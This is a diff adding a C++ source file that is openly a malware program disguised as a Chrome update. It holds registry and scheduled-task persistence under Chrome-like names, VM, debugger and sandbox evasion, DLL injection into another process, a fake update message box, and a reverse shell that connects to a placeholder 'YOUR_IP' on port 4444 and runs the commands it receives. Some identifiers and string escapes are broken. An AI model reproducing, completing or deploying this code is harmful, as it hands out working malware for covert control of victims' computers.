@@ -1,0 +1,536 @@
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <sstream>
+#include <stdexcept>
+#include <vector>
+#include <cstdlib>
+#include <cstdio>
+#include <memory>
+#include <thread>
+#include <chrono>
+#include <functional>
+#include <algorithm>
+#include <limits>
+#include <cmath>
+#include <cstdint>
+#include <ctime>
+#include <cassert>
+#include <cstring>
+#include <cctype>
+#include <clocale>
+#include <cerrno>
+#include <cfenv>
+#include <cinttypes>
+#include <complex>
+#include <typeinfo>
+#include <typeindex>
+#include <random>
+#include <future>
+#include <mutex>
+#include <condition_variable>
+#include <atomic>
+#include <exception>
+#include <new>
+#include <limits>
+#include <ciso646>
+#include <cwchar>
+#include <cwctype>
+#include <csetjmp>
+#include <csignal>
+#include <cstdarg>
+#include <cstdbool>
+#ifdef _WIN32
+#include <windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <mmdeviceapi.h>  // For audio control
+#include <endpointvolume.h> // For audio control
+#include <mfapi.h>         // For webcam access
+#include <mfidl.h>        // For webcam access
+#include <mfreadwrite.h>   // For webcam access
+#include <dshow.h>        // For webcam access
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "advapi32.lib") // Required for registry functions
+#pragma comment(lib, "shell32.lib")  // Required for icon changes
+#pragma comment(lib, "ole32.lib")    // Required for COM initialization
+#pragma comment(lib, "mfplat.lib")   // For Media Foundation
+#pragma comment(lib, "mfuuid.lib")   // For Media Foundation
+#pragma comment(lib, "strmiids.lib")  // For DirectShow
+#else
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+#include <pthread.h>
+#define SOCKET int
+#define INVALID_SOCKET -1
+#define SOCKET_ERROR -1
+#endif
+
+// Enhanced Obfuscation
+#define OBFUSCATE(x) x  // Implement real obfuscation here
+
+// Helper function to execute a command
+std::string exec(const char* cmd) {
+std::array<char, 128> buffer;
+std::string result;
+#ifdef _WIN32
+std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
+#else
+std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
+#endif
+if (!pipe) {
+throw std::runtime_error(OBFUSCATE("popen() failed!"));
+}
+while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+result += buffer.data();
+}
+return result;
+}
+
+// Function to create a hidden file
+void createHiddenFile(const std::string& content) {
+std::ofstream outfile(OBFUSCATE("secret.txt"));
+outfile << content << std::endl;
+outfile.close();
+#ifdef _WIN32
+SetFileAttributesA(OBFUSCATE("secret.txt"), FILE_ATTRIBUTE_HIDDEN);
+#else
+system(OBFUSCATE("mv secret.txt .secret.txt"));
+#endif
+}
+
+// Enhanced Persistence
+void addToStartup() {
+#ifdef _WIN32
+HKEY hKey;
+const char* subKey = OBFUSCATE("Software\Microsoft\Windows\CurrentVersion\Run");
+LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, subKey, 0, KEY_ALL_ACCESS, &hKey);
+
+if (result == ERROR_SUCCESS) {  
+    char path[MAX_PATH];  
+    if (GetModuleFileName(NULL, path, MAX_PATH) != 0) {  
+        const char* valueName = OBFUSCATE("ChromeUpdate"); // Disguise as Chrome update  
+        result = RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)path, strlen(path));  
+
+        if (result == ERROR_SUCCESS) {  
+            std::cout << OBFUSCATE("Successfully added to startup.") << std::endl;  
+        } else {  
+            std::cerr << OBFUSCATE("Failed to add to startup (RegSetValueEx). Error code: ") << result << std::endl;  
+        }  
+    } else {  
+        std::cerr << OBFUSCATE("Failed to get module file name.") << std::endl;  
+    }  
+    RegCloseKey(hKey);  
+} else {  
+    std::cerr << OBFUSCATE("Failed to open registry key. Error code: ") << result << std::endl;  
+}  
+
+// Create a backup startup entry in a different registry location  
+HKEY hKeyBackup;  
+const char* subKeyBackup = OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");  
+result = RegOpenKeyEx(HKEY_CURRENT_USER, subKeyBackup, 0, KEY_ALL_ACCESS, &hKeyBackup);  
+
+if (result == ERROR_SUCCESS) {  
+    char path[MAX_PATH];  
+    if (GetModuleFileName(NULL, path, MAX_MAXPATH) != 0) {  
+        const char* valueName = OBFUSCATE("ChromeUpdateBackup"); // Disguise as Chrome update  
+        result = RegSetValueEx(hKeyBackup, valueName, 0, REG_SZ, (BYTE*)path, strlen(path));  
+
+        if (result == ERROR_SUCCESS) {  
+            std::cout << OBFUSCATE("Successfully added backup startup entry.") << std::endl;  
+        } else {  
+            std::cerr << OBFUSCATE("Failed to add backup startup entry. Error code: ") << result << std::endl;  
+        }  
+    } else {  
+        std::cerr << OBFUSCATE("Failed to get module file name.") << std::endl;  
+    }  
+    RegCloseKey(hKeyBackup);  
+} else {  
+    std::cerr << OBFUSCATE("Failed to open backup registry key. Error code: ") << result << std::endl;  
+}  
+
+// Add a scheduled task as another persistence method  
+char path[MAX_PATH];  
+if (GetModuleFileName(NULL, path, MAX_MAXPATH) != 0) {  
+    std::string taskName = OBFUSCATE("SystemTask");  
+    std::string cmd = "schtasks /create /tn \"" + taskName + "\" /tr \"" + path + "\" /sc minute /mo 15";  
+    system(cmd.c_str());  
+}
+
+#endif
+}
+
+// Enhanced Anti-Detection
+bool isRunningInVM() {
+#ifdef _WIN32
+// Check for common VM artifacts
+HKEY hKey;
+LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, OBFUSCATE("HARDWARE\DEVICEMAP\Scsi\ScsiPort 0\ScsiBus 0\Target Id 0\Logical Unit Id 0"), 0, KEY_READ, &hKey);
+if (result == ERROR_SUCCESS) {
+RegCloseKey(hKey);
+return true; // Likely running in a VM
+}
+
+// Check for specific VM processes  
+const char* vmProcesses[] = { OBFUSCATE("vmtoolsd.exe"), OBFUSCATE("vboxservice.exe") };  
+for (const char* processName : vmProcesses) {  
+    std::string cmd = "tasklist /FI \"imagename eq " + std::string(processName) + "\"";  
+    std::string output = exec(cmd.c_str());  
+    if (output.find(processName) != std::string::npos) {  
+        return true; // VM process found  
+    }  
+}
+
+#endif
+return false;
+}
+
+// Reverse shell function with improved error handling
+void reverseShell(const std::string& ip, int port) {
+#ifdef _WIN32
+WSADATA wsaData;
+if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+std::cerr << OBFUSCATE("WSAStartup failed.") << std::endl;
+return;
+}
+#endif
+
+SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);  
+if (sock == INVALID_SOCKET) {  
+    std::cerr << OBFUSCATE("Socket creation failed.") << std::endl;
+
+#ifdef _WIN32
+WSACleanup();
+#endif
+return;
+}
+
+sockaddr_in serverAddr;  
+serverAddr.sin_family = AF_INET;
+
+#ifdef _WIN32
+serverAddr.sin_addr.s_addr = inet_addr(ip.c_str());
+#else
+inet_pton(AF_INET, ip.c_str(), &(serverAddr.sin_addr));
+#endif
+serverAddr.sin_port = htons(port);
+
+if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {  
+    std::cerr << OBFUSCATE("Connection failed.") << std::endl;
+
+#ifdef _WIN32
+closesocket(sock);
+WSACleanup();
+#else
+close(sock);
+#endif
+return;
+}
+
+char buffer[1024];  
+std::string command;  
+
+while (true) {  
+    memset(buffer, 0, sizeof(buffer));  
+    int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);  
+    if (bytesReceived <= 0) {  
+        std::cerr << OBFUSCATE("Connection closed.") << std::endl;  
+        break;  
+    }  
+    command = buffer;  
+    command = command.substr(0, bytesReceived);  
+
+    std::string output = exec(command.c_str());  
+    send(sock, output.c_str(), output.length(), 0);  
+}
+
+#ifdef _WIN32
+closesocket(sock);
+WSACleanup();
+#else
+close(sock);
+#endif
+}
+
+// Function to gain persistence by creating a scheduled task
+void createScheduledTask() {
+#ifdef _WIN32
+char path[MAX_PATH];
+if (GetModuleFileName(NULL, path, MAX_MAXPATH) == 0) {
+std::cerr << OBFUSCATE("Failed to get module file name for scheduled task.") << std::endl;
+return;
+}
+
+std::string taskName = OBFUSCATE("ChromeUpdateTask"); // Disguise as Chrome update task  
+std::string cmd = "schtasks /create /tn \"" + taskName + "\" /tr \"" + path + "\" /sc minute /mo 5";  
+
+system(cmd.c_str());  
+std::cout << OBFUSCATE("Scheduled task created.") << std::endl;
+
+#endif
+}
+
+// Function to change the icon of the executable
+bool changeIcon(const char* filePath, const char* iconPath) {
+#ifdef _WIN32
+HMODULE hShell32 = LoadLibraryA("shell32.dll");
+if (hShell32 == NULL) {
+std::cerr << OBFUSCATE("Failed to load shell32.dll") << std::endl;
+return false;
+}
+
+typedef VOID (WINAPI *pSHChangeNotify)(HCHANGE notifyEvent, UINT flags, LPCVOID item1, LPCVOID item2);  
+pSHChangeNotify SHChangeNotify = (pSHChangeNotify)GetProcAddress(hShell32, "SHChangeNotify");  
+
+if (SHChangeNotify == NULL) {  
+    std::cerr << OBFUSCATE("Failed to get SHChangeNotify function") << std::endl;  
+    FreeLibrary(hShell32);  
+    return false;  
+}  
+
+HICON hIcon = (HICON)LoadImageA(NULL, iconPath, IMAGE_ICON, 32, 32, LR_LOADFROMFILE | LR_DEFAULTSIZE);  
+if (hIcon == NULL) {  
+    std::cerr << OBFUSCATE("Failed to load icon file") << std::endl;  
+    FreeLibrary(hShell32);  
+    return false;  
+}  
+
+// Extract the icon resource from the executable  
+HMODULE hExeModule = LoadLibraryExA(filePath, NULL, LOAD_LIBRARY_AS_DATAFILE);  
+if (hExeModule == NULL) {  
+    std::cerr << OBFUSCATE("Failed to load executable as data file") << std::endl;  
+    DestroyIcon(hIcon);  
+    FreeLibrary(hShell32);  
+    return false;  
+}  
+
+HRSRC hIconResource = FindResourceA(hExeModule, MAKEINTRESOURCE(101), RT_ICON); // Assuming icon resource ID is 101  
+if (hIconResource == NULL) {  
+    std::cerr << OBFUSCATE("Failed to find icon resource") << std::endl;  
+    FreeLibrary(hExeModule);  
+    DestroyIcon(hIcon);  
+    FreeLibrary(hShell32);  
+    return false;  
+}  
+
+HGLOBAL hIconData = LoadResource(hExeModule, hIconResource);  
+if (hIconData == NULL) {  
+    std::cerr << OBFUSCATE("Failed to load icon data") << std::endl;  
+    FreeLibrary(hExeModule);  
+    DestroyIcon(hIcon);  
+    FreeLibrary(hShell32);  
+    return false;  
+}  
+
+void* pIconData = LockResource(hIconData);  
+if (pIconData == NULL) {  
+    std::cerr << OBFUSCATE("Failed to lock icon data") << std::endl;  
+    FreeLibrary(hExeModule);  
+    DestroyIcon(hIcon);  
+    FreeLibrary(hShell32);  
+    return false;  
+}  
+
+DWORD iconSize = SizeofResource(hExeModule, hIconResource);  
+
+// Update the executable's icon resource  
+HANDLE hUpdate = BeginUpdateResourceA(filePath, FALSE);  
+if (hUpdate == NULL) {  
+    std::cerr << OBFUSCATE("Failed to begin resource update") << std::endl;  
+    FreeLibrary(hExeModule);  
+    DestroyIcon(hIcon);  
+    FreeLibrary(hShell32);  
+    return false;  
+}  
+
+if (!UpdateResourceA(hUpdate, RT_ICON, MAKEINTRESOURCE(101), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), pIconData, iconSize)) {  
+    std::cerr << OBFUSCATE("Failed to update resource") << std::endl;  
+    EndUpdateResourceA(hUpdate, TRUE);  
+    FreeLibrary(hExeModule);  
+    DestroyIcon(hIcon);  
+    FreeLibrary(hShell32);  
+    return false;  
+}  
+
+if (!EndUpdateResourceA(hUpdate, FALSE)) {  
+    std::cerr << OBFUSCATE("Failed to end resource update") << std::endl;  
+    FreeLibrary(hExeModule);  
+    DestroyIcon(hIcon);  
+    FreeLibrary(hShell32);  
+    return false;  
+}  
+
+FreeLibrary(hExeModule);  
+DestroyIcon(hIcon);  
+FreeLibrary(hShell32);  
+
+// Notify the system to update the icon  
+SHChangeNotify(HCHANGE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);  
+
+std::cout << OBFUSCATE("Icon changed successfully.") << std::endl;  
+return true;
+
+#else
+std::cerr << OBFUSCATE("Icon changing is only supported on Windows.") << std::endl;
+return false;
+#endif
+}
+
+// Function to inject code into another process
+bool injectCode(DWORD processId, const char* dllPath) {
+#ifdef _WIN32
+HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+if (hProcess == NULL) {
+std::cerr << OBFUSCATE("Failed to open process") << std::endl;
+return false;
+}
+
+void* dllPathAddress = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);  
+if (dllPathAddress == NULL) {  
+    std::cerr << OBFUSCATE("Failed to allocate memory in process") << std::endl;  
+    CloseHandle(hProcess);  
+    return false;  
+}  
+
+if (!WriteProcessMemory(hProcess, dllPathAddress, dllPath, strlen(dllPath) + 1, NULL)) {  
+    std::cerr << OBFUSCATE("Failed to write to process memory") << std::endl;  
+    CloseHandle(hProcess);  
+    VirtualFreeEx(hProcess, dllPathAddress, 0, MEM_RELEASE);  
+    return false;  
+}  
+
+HMODULE hKernel32 = GetModuleHandleA(OBFUSCATE("kernel32.dll"));  
+if (hKernel32 == NULL) {  
+    std::cerr << OBFUSCATE("Failed to get kernel32.dll handle") << std::endl;  
+    CloseHandle(hProcess);  
+    VirtualFreeEx(hProcess, dllPathAddress, 0, MEM_RELEASE);  
+    return false;  
+}  
+
+void* loadLibraryAddress = GetProcAddress(hKernel32, OBFUSCATE("LoadLibraryA"));  
+if (loadLibraryAddress == NULL) {  
+    std::cerr << OBFUSCATE("Failed to get LoadLibraryA address") << std::endl;  
+    CloseHandle(hProcess);  
+    VirtualFreeEx(hProcess, dllPathAddress, 0, MEM_RELEASE);  
+    return false;  
+}  
+
+HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddress, 0, NULL);  
+if (hThread == NULL) {  
+    std::cerr << OBFUSCATE("Failed to create remote thread") << std::endl;  
+    CloseHandle(hProcess);  
+    VirtualFreeEx(hProcess, dllPathAddress, 0, MEM_RELEASE);  
+    return false;  
+}  
+
+WaitForSingleObject(hThread, INFINITE);  
+CloseHandle(hThread);  
+CloseHandle(hProcess);  
+VirtualFreeEx(hProcess, dllPathAddress, 0, MEM_RELEASE);  
+
+std::cout << OBFUSCATE("Code injected successfully.") << std::endl;  
+return true;
+
+#else
+std::cerr << OBFUSCATE("Code injection is only supported on Windows.") << std::endl;
+return false;
+#endif
+}
+
+// Anti-Debugging Techniques
+bool isDebuggerPresent() {
+#ifdef _WIN32
+BOOL isDbgPresent = FALSE;
+CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDbgPresent);
+return isDbgPresent;
+#else
+return false;
+#endif
+}
+
+// Function to perform sandbox evasion
+bool evadeSandbox() {
+#ifdef _WIN32
+// Check for mouse movement
+POINT mousePos;
+GetCursorPos(&mousePos);
+Sleep(1000);
+POINT newMousePos;
+GetCursorPos(&newMousePos);
+if (mousePos.x == newMousePos.x && mousePos.y == newMousePos.y) {
+return true; // No user interaction, likely a sandbox
+}
+
+// Check for specific sandbox files  
+const char* sandboxFiles[] = { OBFUSCATE("C:\\sandbox.txt"), OBFUSCATE("C:\\sample.exe") };  
+for (const char* file : sandboxFiles) {  
+    if (GetFileAttributesA(file) != INVALID_FILE_ATTRIBUTES) {  
+        return true; // Sandbox file found  
+    }  
+}
+
+#endif
+return false;
+}
+
+int main() {
+// Anti-Debugging
+if (isDebuggerPresent()) {
+std::cerr << OBFUSCATE("Debugger detected. Exiting.") << std::endl;
+return 1;
+}
+
+// Sandbox Evasion  
+if (evadeSandbox()) {  
+    std::cerr << OBFUSCATE("Sandbox detected. Sleeping for a while.") << std::endl;
+
+#ifdef _WIN32
+Sleep(60000); // Sleep for 60 seconds
+#else
+sleep(60);
+#endif
+}
+
+// Change the icon to look like Chrome  
+const char* iconPath = OBFUSCATE("chrome.ico"); // Replace with the actual path to the Chrome icon  
+const char* exePath = OBFUSCATE("malware.exe");   // Replace with the actual path to the executable  
+
+if (changeIcon(exePath, iconPath)) {  
+    std::cout << OBFUSCATE("Successfully changed the icon.") << std::endl;  
+} else {  
+    std::cerr << OBFUSCATE("Failed to change the icon.") << std::endl;  
+}  
+
+// Execute a command  
+system(OBFUSCATE("echo Executing malicious code..."));  
+
+// Create a hidden file  
+createHiddenFile(OBFUSCATE("This is a secret"));  
+
+// Add to startup (more resilient)  
+addToStartup();  
+
+// Create scheduled task for persistence  
+createScheduledTask();  
+
+// Inject code into another process  
+DWORD targetProcessId = 1234; // Replace with the actual process ID  
+const char* dllPath = OBFUSCATE("evil.dll");  // Replace with the actual DLL path  
+if (injectCode(targetProcessId, dllPath)) {  
+    std::cout << OBFUSCATE("Successfully injected code into process.") << std::endl;  
+} else {  
+    std::cerr << OBFUSCATE("Failed to inject code into process.") << std::endl;  
+}  
+
+// Start reverse shell  
+std::thread reverseShellThread(reverseShell, OBFUSCATE("YOUR_IP"), 4444);  
+reverseShellThread.detach();  
+
+// Display a message  
+MessageBox(NULL, OBFUSCATE("Chrome is updating in the background..."), OBFUSCATE("Chrome Update"), MB_OK | MB_ICONINFORMATION); // Disguise as Chrome update  
+
+return 0;
+
+}
